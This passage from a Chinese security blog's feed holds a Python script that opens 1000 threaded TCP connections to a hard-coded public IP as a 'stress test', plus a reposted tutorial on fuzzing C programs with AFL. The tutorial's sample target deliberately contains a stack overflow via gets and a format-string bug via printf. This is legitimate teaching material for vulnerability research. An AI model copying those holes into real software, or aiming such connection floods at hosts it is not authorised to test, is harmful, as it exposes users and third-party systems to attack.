class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"122.51.252.101"</span>  <span class="comment"># tcp压力测试ip 122.51.252.101</span></span><br><span class="line">PORT = <span class="number">7474</span></span><br><span class="line">thread_number = <span class="number">1000</span></span><br><span class="line">BUF_SIZE = <span class="number">1024</span></span><br><span class="line">Address = (HOST, PORT)</span><br><span class="line">message = <span class="string">"hello"</span></span><br><span class="line">tcp_connect_data = []</span><br><span class="line">threadLock = threading.Lock()  <span class="comment"># 进程锁</span></span><br><span class="line"><span class="comment"># AF_INET用于不同机器之间的通信 AF_UNIX只能用于本机内进程之间的通信。</span></span><br><span class="line"><span class="comment"># SOCK_STREAM是基于TCP的，数据传输比较有保障。SOCK_DGRAM是基于UDP的，专门用于局域网</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取毫秒级时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_time_ms</span><span class="params">()</span>:</span></span><br><span class="line">    ct = time.time()    <span class="comment"># 时间戳</span></span><br><span class="line">    local_time = time.localtime(ct)  <span class="comment"># 本地化时间</span></span><br><span class="line">    cart_time_strftime = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, local_time)  <span class="comment"># 格式化时间</span></span><br><span class="line">    cart_time_strftime_ms = (ct - int(ct)) * <span class="number">1000</span></span><br><span class="line">    ms = <span class="string">"%s.%03d"</span> % (cart_time_strftime, cart_time_strftime_ms)  <span class="comment"># 拼接，获取毫秒级时间</span></span><br><span class="line">    <span class="keyword">return</span> ms, ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  建立tcp连接</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_connect</span><span class="params">()</span>:</span></span><br><span class="line">    error_flag = <span class="number">0</span></span><br><span class="line">    tcp_socket = socket(AF_INET, SOCK_STREAM)  <span class="comment"># 创建socket对象 tcp连接</span></span><br><span class="line">    tcp_socket.settimeout(<span class="number">20</span>)  <span class="comment"># 设置最大连接时间20s</span></span><br><span class="line">    time1 = get_time_ms()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tcp_socket.connect(Address)</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        receive_data = tcp_socket.recv(BUF_SIZE)        </span></span><br><span class="line"><span class="string">        # print(receive_data.decode('utf-8'))</span></span><br><span class="line"><span class="string">        tcp_socket.send(message.encode('utf-8'))  </span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_flag = <span class="number">1</span></span><br><span class="line">        print(<span class="string">"tcpConnError"</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    time2 = get_time_ms()</span><br><span class="line">    delay_time = (time2[<span class="number">1</span>] - time1[<span class="number">1</span>])*<span class="number">1000</span></span><br><span class="line">    data = delay_time, error_flag</span><br><span class="line">    tcp_connect_data.append(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, thread_id)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadId = thread_id</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        threadLock.acquire()  <span class="comment"># 获取锁，用于线程同步</span></span><br><span class="line">        tcp_connect()</span><br><span class="line">        threadLock.release()  <span class="comment"># 释放锁，开启下一个线程</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.threadId)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locust</span><span class="params">()</span>:</span></span><br><span class="line">    test_thread = MyThread(<span class="number">0</span>)</span><br><span class="line">    test_thread.start()</span><br><span class="line">    test_thread.join()</span><br><span class="line">    delay_time_max = tcp_connect_data[test_thread.threadId][<span class="number">0</span>]  <span class="comment"># 初始化最大时延和最小时延</span></span><br><span class="line">    delay_time_min = delay_time_max</span><br><span class="line">    error_times, success_times, total_time = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>     <span class="comment"># 初始化连接数</span></span><br><span class="line">    threads = []</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, thread_number+<span class="number">1</span>):</span><br><span class="line">        t = MyThread(i)</span><br><span class="line">        threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        <span class="comment"># t.setDaemon(True)  # 把多线程设置为守护线程</span></span><br><span class="line">        t.start()  <span class="comment"># 开始执行多线程</span></span><br><span class="line">        <span class="comment"># t.info()</span></span><br><span class="line">        t.join()  <span class="comment"># 等待线程执行完成</span></span><br><span class="line">        delay_time = tcp_connect_data[t.threadId][<span class="number">0</span>]</span><br><span class="line">        error_flag = tcp_connect_data[t.threadId][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> delay_time_max &lt; delay_time:  <span class="comment"># 更新最大时延和最小时延</span></span><br><span class="line">            delay_time_max = delay_time</span><br><span class="line">        <span class="keyword">if</span> delay_time_min &gt; delay_time:</span><br><span class="line">            delay_time_min = delay_time</span><br><span class="line">        total_time += delay_time</span><br><span class="line">        delay_time_average = total_time/t.threadId</span><br><span class="line">        error_times += error_flag</span><br><span class="line">        success_times = t.threadId - error_times</span><br><span class="line">        print(<span class="string">"%s 执行时间为 %s\n"</span> % (t, get_time_ms()[<span class="number">0</span>]))  <span class="comment"># 输出执行时间</span></span><br><span class="line">        print(<span class="string">"平均往返时延(ms): %s 本次时延: %s 最大时延: %s 最小时延: %s 拒绝连接次数: %s 成功连接数: %s\n"</span> %</span><br><span class="line">              (delay_time_average, delay_time, delay_time_max, delay_time_min, error_times, success_times))</span><br><span class="line">        thread_data = (delay_time_average, delay_time, delay_time_max, delay_time_min, error_times, success_times), t</span><br><span class="line">        data.append(thread_data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    locust()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;task-manager-py&quot;&gt;&lt;a href=&quot;#task-manager-py&quot; class=&quot;headerlink&quot; title=&quot;task_manager.py&quot;&gt;&lt;/a&gt;task_manager.py&lt;/h2&gt;&lt;figure class=&quot;highli
      
    
    </summary>
    
      <category term="python" scheme="https://nocbtm.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://nocbtm.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>AFL漏洞挖掘</title>
    <link href="https://nocbtm.github.io/2019/11/12/AFL%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>https://nocbtm.github.io/2019/11/12/AFL漏洞挖掘/</id>
    <published>2019-11-12T12:02:02.000Z</published>
    <updated>2020-04-09T01:11:07.247Z</updated>
    
    <content type="html"><![CDATA[<p>转载于 ：<a href="https://www.freebuf.com/articles/system/191543.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/191543.html</a></p><h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一 前言"></a>一 前言</h2><p>模糊测试（Fuzzing）技术作为漏洞挖掘最有效的手段之一，近年来一直是众多安全研究人员发现漏洞的首选技术。AFL、LibFuzzer、honggfuzz等操作简单友好的工具相继出现，也极大地降低了模糊测试的门槛。</p><p><img alt="" data-src="https://i.loli.net/2019/11/17/gpEyeKHY6JqSQPz.jpg" class="lozad"></p><h2 id="二-AFL简介"><a href="#二-AFL简介" class="headerlink" title="二 AFL简介"></a>二 AFL简介</h2><p>AFL（American Fuzzy Lop）是由安全研究员Michał Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。其工作流程大致如下：</p><ul><li><p>①从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</p></li><li><p>②选择一些输入文件，作为初始测试集加入输入队列（queue）；</p></li><li><p>③将队列中的文件按一定的策略进行“突变”；</p></li><li><p>④如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;</p></li><li><p>⑤上述过程会一直循环进行，期间触发了crash的文件会被记录下来。</p></li></ul><p><img alt="" data-src="https://i.loli.net/2019/11/17/26iNMIudQhyRXpG.jpg" class="lozad"></p><h2 id="三-选择和评估测试的目标"><a href="#三-选择和评估测试的目标" class="headerlink" title="三 选择和评估测试的目标"></a>三 选择和评估测试的目标</h2><p>开始Fuzzing前，首先要选择一个目标。 AFL的目标通常是接受外部输入的程序或库，输入一般来自文件（也可以Fuzzing一个网络程序）。</p><ol><li><p>用什么语言编写<br>AFL主要用于C/C++程序的测试，所以这是我们寻找软件的最优先规则。（也有一些基于AFL的JAVA Fuzz程序如kelinci、java-afl等）</p></li><li><p>是否开源<br>AFL既可以对源码进行编译时插桩，也可以使用AFL的QEMU mode对二进制文件进行插桩，但是前者的效率相对来说要高很多，在Github上很容易就能找到很多合适的项目。</p></li><li><p>程序版本<br>目标应该是该软件的最新版本，不然辛辛苦苦找到一个漏洞，却发现早就被上报修复了就尴尬了。</p></li><li><p>是否有示例程序、测试用例<br>如果目标有现成的基本代码示例，特别是一些开源的库，可以方便我们调用该库不用自己再写一个程序；如果目标存在测试用例，那后面构建语料库时也省事儿一点。</p></li><li><p>项目规模<br>某些程序规模很大，会被分为好几个模块，为了提高Fuzz效率，在Fuzzing前，需要定义Fuzzing部分。这里推荐一下源码阅读工具Understand，它treemap功能，可以直观地看到项目结构和规模。</p></li><li>程序曾出现过漏洞<br>如果某个程序曾曝出过多次漏洞，那么该程序有仍有很大可能存在未被发现的安全漏洞。</li></ol><h2 id="四-构建语料库"><a href="#四-构建语料库" class="headerlink" title="四 构建语料库"></a>四 构建语料库</h2><p>AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。lcamtuf就在博客中给出了一个有趣的例子——对djpeg进行Fuzzing时，仅用一个字符串”hello”作为输入，最后凭空生成大量jpge图像！</p><p>尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库，这一节就解决如何选择输入文件、从哪里寻找这些文件、如何精简找到的文件三个问题。</p><h3 id="1-选择"><a href="#1-选择" class="headerlink" title="1. 选择"></a>1. 选择</h3><p>(1) 有效的输入</p><p>尽管有时候无效输入会产生bug和崩溃，但有效输入可以更快的找到更多执行路径。</p><p>(2) 尽量小的体积</p><p>较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存，AFL给出的建议是最好小于1 KB，但其实可以根据自己测试的程序权衡，这在AFL文档的perf_tips.txt中有具体说明。</p><h3 id="2-寻找"><a href="#2-寻找" class="headerlink" title="2. 寻找"></a>2. 寻找</h3><p>使用项目自身提供的测试用例</p><p>目标程序bug提交页面</p><p>使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式：</p><p>afl源码的testcases目录下提供了一些测试用例</p><p>其他开源的语料库</p><h3 id="3-修剪"><a href="#3-修剪" class="headerlink" title="3. 修剪"></a>3. 修剪</h3><p>网上找到的一些大型语料库中往往包含大量的文件，这时就需要对其精简，这个工作有个术语叫做——语料库蒸馏（Corpus Distillation）。AFL提供了两个工具来帮助我们完成这部工作——afl-cmin和afl-tmin。<br>(1) 移除执行相同代码的输入文件——afl-cmin</p><p>afl-cmin的核心思想是：尝试找到与语料库全集具有相同覆盖范围的最小子集。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</span><br></pre></td></tr></table></figure></p><p>更多的时候，我们需要从文件中获取输入，这时可以使用“@@”代替被测试程序命令行中输入文件名的位置。Fuzzer会将其替换为实际执行的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure></p><p>(2) 减小单个输入文件的大小——afl-tmin<br>整体的大小得到了改善，接下来还要对每个文件进行更细化的处理。afl-tmin缩减文件体积的原理这里就不深究了，有机会会在后面文章中解释，这里只给出使用方法（其实也很简单，有兴趣的朋友可以自己搜一搜）。</p><p>afl-tmin有两种工作模式，instrumented mode和crash mode。默认的工作方式是instrumented mode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure></p><p>如果指定了参数-x，即crash mode，会把导致程序非正常退出的文件直接剔除。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><p>afl-tmin接受单个文件输入，所以可以用一条简单的shell脚本批量处理。如果语料库中文件数量特别多，且体积特别大的情况下，这个过程可能花费几天甚至更长的时间！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> *; <span class="keyword">do</span> afl-tmin -i <span class="variable">$i</span> -o tmin-<span class="variable">$i</span> -- ~/path/to/tested/program [params] @@; <span class="keyword">done</span>;s</span><br></pre></td></tr></table></figure><h2 id="五-构建被测试程序"><a href="#五-构建被测试程序" class="headerlink" title="五 构建被测试程序"></a>五 构建被测试程序</h2><p>前面说到，AFL从源码编译程序时进行插桩，以记录代码覆盖率。这个工作需要使用其提供的两种编译器的wrapper编译目标程序，和普通的编译过程没有太大区别</p><h3 id="1-afl-gcc模式"><a href="#1-afl-gcc模式" class="headerlink" title="1. afl-gcc模式"></a>1. afl-gcc模式</h3><p>afl-gcc/afl-g++作为gcc/g++的wrapper，它们的用法完全一样，前者会将接收到的参数传递给后者，我们编译程序时只需要将编译器设置为afl-gcc/afl-g++就行，如下面演示的那样。如果程序不是用autoconf构建，直接修改Makefile文件中的编译器为afl-gcc/g++也行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure CC=<span class="string">"afl-gcc"</span> CXX=<span class="string">"afl-g++"</span></span><br></pre></td></tr></table></figure><p>在Fuzzing共享库时，可能需要编写一个简单demo，将输入传递给要Fuzzing的库（其实大多数项目中都自带了类似的demo）。这种情况下，可以通过设置LD_LIBRARY_PATH让程序加载经过AFL插桩的.so文件，不过最简单的方法是静态构建，通过以下方式实现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure --<span class="built_in">disable</span>-shared CC=<span class="string">"afl-gcc"</span> CXX=<span class="string">"afl-g++"</span></span><br></pre></td></tr></table></figure><h3 id="2-LLVM模式"><a href="#2-LLVM模式" class="headerlink" title="2. LLVM模式"></a>2. LLVM模式</h3><p>LLVM Mode模式编译程序可以获得更快的Fuzzing速度，进入llvm_mode目录进行编译，之后使用afl-clang-fast构建序程序即可，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> llvm_mode$ apt-get install clang$ <span class="built_in">export</span> LLVM_CONFIG=`<span class="built_in">which</span> llvm-config` &amp;&amp; make &amp;&amp; <span class="built_in">cd</span> ..$ ./configure --<span class="built_in">disable</span>-shared CC=<span class="string">"afl-clang-fast"</span> CXX=<span class="string">"afl-clang-fast++"</span></span><br></pre></td></tr></table></figure><p>在使用高版本的clang编译时可能会报错，换成clang-3.9后通过编译，如果你的系统默认安装的clang版本过高，可以安装多个版本然后使用update-alternatives切换。</p><h2 id="六-开始Fuzzing"><a href="#六-开始Fuzzing" class="headerlink" title="六 开始Fuzzing"></a>六 开始Fuzzing</h2><h3 id="1-白盒测试"><a href="#1-白盒测试" class="headerlink" title="1. 白盒测试"></a>1. 白盒测试</h3><h4 id="1-测试插桩程序"><a href="#1-测试插桩程序" class="headerlink" title="(1) 测试插桩程序"></a>(1) 测试插桩程序</h4><p>编译好程序后，可以选择使用afl-showmap跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组（tuples），tuple用于获取分支信息，从而衡量衡量程序覆盖情况，下一篇文章中会详细的解释，这里可以先不用管。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-showmap -m none -o /dev/null -- ./build/bin/imagew 23.bmp out.png[*] Executing <span class="string">'./build/bin/imagew'</span>...-- Program output begins --23.bmp -&gt; out.pngProcessing: 13x32-- Program output ends --[+] Captured 1012 tuples <span class="keyword">in</span> <span class="string">'/dev/null'</span>.</span><br></pre></td></tr></table></figure><p>使用不同的输入，正常情况下afl-showmap会捕获到不同的tuples，这就说明我们的的插桩是有效的，还有前面提到的afl-cmin就是通过这个工具来去掉重复的输入文件。</p><h4 id="2-执行fuzzer"><a href="#2-执行fuzzer" class="headerlink" title="(2) 执行fuzzer"></a>(2) 执行fuzzer</h4><p>在执行afl-fuzz前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改core_pattern文件，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p>之后就可以执行afl-fuzz了，通常的格式是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params]</span><br></pre></td></tr></table></figure><p>或者使用“@@”替换输入文件，Fuzzer会将其替换为实际执行的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure><p>如果没有什么错误，Fuzzer就正式开始工作了。首先，对输入队列中的文件进行预处理；然后给出对使用的语料库可警告信息，比如下图中提示有个较大的文件（14.1KB），且输入文件过多；最后，开始Fuzz主循环，显示状态窗口。</p><p>测试源代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'A'</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'F'</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"it is good!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>AFL状态窗口</p><p><img alt="" data-src="https://i.loli.net/2019/11/17/tD5GNCSJ4nAxukH.png" class="lozad"></p><p>① Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。</p><p>② Overall results：Fuzzer当前状态的概述。</p><p>③ Cycle progress：我们输入队列的距离。</p><p>④ Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。</p><p>⑤ Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。</p><p>⑥ Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。</p><p>⑦ Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。</p><p>⑧ Path geometry：有关Fuzzer找到的执行路径的信息。</p><p>⑨ CPU load：CPU利用率</p><h4 id="3-使用screen"><a href="#3-使用screen" class="headerlink" title="(3) 使用screen"></a>(3) 使用screen</h4><p>一次Fuzzing过程通常会持续很长时间，如果这期间运行afl-fuzz实例的终端终端被意外关闭了，那么Fuzzing也会被中断。而通过在screen session中启动每个实例，可以方便的连接和断开。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ screen afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure></p><p>也可以为每个session命名，方便重新连接。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ screen -S fuzzer1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] @@[detached from 6999.fuzzer1]$ screen -r fuzzer1  ...</span><br></pre></td></tr></table></figure></p><h3 id="2-黑盒测试"><a href="#2-黑盒测试" class="headerlink" title="2. 黑盒测试"></a>2. 黑盒测试</h3><p>所谓黑盒测试，通俗地讲就是对没有源代码的程序进行测试，这时就要用到AFL的QEMU模式了。启用方式和LLVM模式类似，也要先编译。但注意，因为AFL使用的QEMU版本太旧，util/memfd.c中定义的函数memfd_create()会和glibc中的同名函数冲突，在这里可以找到针对QEMU的patch，之后运行脚本build_qemu_support.sh就可以自动下载编译。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y$ </span><br><span class="line">$ <span class="built_in">cd</span> qemu_mode$ build_qemu_support.sh$ <span class="built_in">cd</span> .. &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>现在起，只需添加-Q选项即可使用QEMU模式进行Fuzzing。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -Q -i testcase_dir -o findings_dir /path/to/program [params] @@</span><br></pre></td></tr></table></figure></p><h2 id="七-结束测试"><a href="#七-结束测试" class="headerlink" title="七 结束测试"></a>七 结束测试</h2><h3 id="1-何时结束"><a href="#1-何时结束" class="headerlink" title="1.何时结束"></a>1.何时结束</h3><p>检查afl-fuzz工作状态的目的是为何时停止测试提供依据，通常来说符合下面几种情况时就可以停掉了。</p><p>（1）状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考，随着周期数不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。当其变为绿色时，继续Fuzzing下去也很难有新的发现了，这时便可以通过Ctrl-C停止afl-fuzz。</p><p>（2）距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握，比如长达一个星期或者更久估计大家也都没啥耐心了吧。</p><p>（3）目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见，但是对于某些小型程序应该还是可能的，至于如何计算覆盖率将在下面介绍。</p><p>（4）上面提到的pythia提供的各种数据中，一旦path covera达到99％（通常来说不太可能），如果不期望再跑出更多crash的话就可以中止fuzz了，因为很多crash可能是因为相同的原因导致的；还有一点就是correctness的值达到1e-08，根据pythia开发者的说法，这时从上次发现path/uniq crash到下一次发现之间大约需要1亿次执行，这一点也可以作为衡量依据。</p><h3 id="2-输出结果"><a href="#2-输出结果" class="headerlink" title="2. 输出结果"></a>2. 输出结果</h3><p>afl-fuzz的输出目录中存在很多文件，有时想要写一个辅助工具可能就要用到其中的文件。下面以多个fuzz实例并行测试时的同步目录为例：<br><img alt="" data-src="https://i.loli.net/2019/11/19/FNkeoOia15yUQXK.png" class="lozad"></p><p>queue：存放所有具有独特执行路径的测试用例。</p><p>crashes：导致目标接收致命signal而崩溃的独特测试用例。</p><p>crashes/README.txt：保存了目标执行这些crash文件的命令行参数。</p><p>hangs：导致目标超时的独特测试用例。</p><p>fuzzer_stats：afl-fuzz的运行状态。</p><p>plot_data：用于afl-plot绘图。</p><h2 id="八-处理测试结果"><a href="#八-处理测试结果" class="headerlink" title="八 处理测试结果"></a>八 处理测试结果</h2><p>到了这里，我们可能已经跑出了一大堆的crashes，那么接下来的步骤，自然是确定造成这些crashes的bug是否可以利用，怎么利用？这是另一个重要方面。当然，个人觉得这比前面提到的内容都要困难得多，这需要对常见的二进制漏洞类型、操作系统的安全机制、代码审计和调试等内容都有一定深度的了解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;转载于 ：&lt;a href=&quot;https://www.freebuf.com/articles/system/191543.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/articles/system
      
    
    </summary>
    
      <category term="漏洞挖掘" scheme="https://nocbtm.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
      <category term="漏洞挖掘" scheme="https://nocbtm.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
</feed>
